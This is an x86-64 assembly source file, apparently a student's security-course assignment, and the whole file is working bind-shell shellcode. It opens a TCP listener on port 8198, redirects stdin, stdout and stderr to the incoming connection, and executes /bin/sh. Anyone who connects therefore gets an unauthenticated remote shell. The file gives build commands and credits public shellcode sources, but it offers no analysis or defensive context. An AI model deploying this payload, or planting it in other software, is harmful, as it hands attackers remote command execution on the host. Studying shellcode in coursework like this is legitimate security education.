; Lucas Burke
; 3 May 2019
; CS4678 - Assignment 2
; Binary: nasm -f bin mybind.asm
; Assembly (for localhost testing): nasm -f elf64 -g mybind.asm
; Linker: ld -o mybind -m elf_x86_64 mybind.o
; Comments: Set at port 8198.
; Help:
; [sock_struct - https://github.com/zerosum0x0/SLAE64/blob/master/bindshell/bindshell.asm] and explanation from CS3140
; [execve - http://shell-storm.org/shellcode/files/shellcode-873.php] and explanation from CS3140

bits 64
global _start
section .text
_start:
	xor r8, r8
	xor r9, r9
	
;socket(af_inet=2 (internet IP), sock_stream=1 (tcp), protocol=0(unspecified))
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	mov rax, 41
	syscall
	mov rdi, rax ; rdi has sock fd
;struct setup
  xor rax, rax
  push rax ;(NULL)
  push 0x0620
  mov [rsp+1],al
  mov r8, rsp
; bind(sock, *sock_struct, sockaddr_len)
	;rdi still has sock fd
	mov rsi, r8 ;struct 
  mov rdx, 16 ; len of addr (16 bytes)
  mov rax, 49
  syscall
;listen(sockfd, max_connex)
  ;rdi still has sockfd
	mov rsi, 2  ;2 max connex (my connex and any debug connex)
	mov rax, 50
	syscall
;accept(sock, *peer, sockaddr_len)
  ;rdi still has sockfd
	xor rsi, rsi
  mov rdx, 16
  mov rax, 43
  syscall
	mov r9, rax ; my new_connex fd
;close(fd)
	;rdi still holds old connection fd
  mov rax, 3
  syscall
;dupe
  xor rsi, rsi
  mov rsi, 3 ; need 3 for loop to work
  .dup:
    mov rdi, r9 ;new_connex fd
    ;rsi set above
    dec rsi
    mov rax, 33
    syscall
    jnz .dup  
 ;execve("/bin//sh",*{"bin//sh","0x00"},'0x00')
  xor rax, rax
  push rax 										;null terminator
  mov rbx, 0x68732f2f6e69622f ;"/bin//sh"
  push rbx 										;push onto stack
  mov rdi, rsp 								;rdi points -> "/bin//sh"
  push rax										;push null terminator
  mov rdx, rsp								;rdx points -> '0x00'
  push rdi										;push addr of "/bin//sh" 
  mov rsi, rsp 								;rsi->*{"bin//sh","0x00"}
  mov rax, 59
  syscall
